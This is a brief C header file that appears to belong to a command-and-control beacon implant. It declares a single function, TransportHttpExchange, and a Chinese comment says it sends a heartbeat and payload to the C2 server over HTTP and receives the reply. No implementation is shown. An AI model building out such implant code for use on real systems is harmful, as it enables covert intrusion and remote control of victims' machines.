#pragma once

#include "beacon_common.h"
#include "beacon_profile.h"

/*
 * HTTP 传输交换：发送心跳+payload 到 C2，接收响应。
 * response 由调用方负责释放。
 */
INT TransportHttpExchange(const Profile* profile, const ByteBuf* metadata, const ByteBuf* payload, ByteBuf* response);
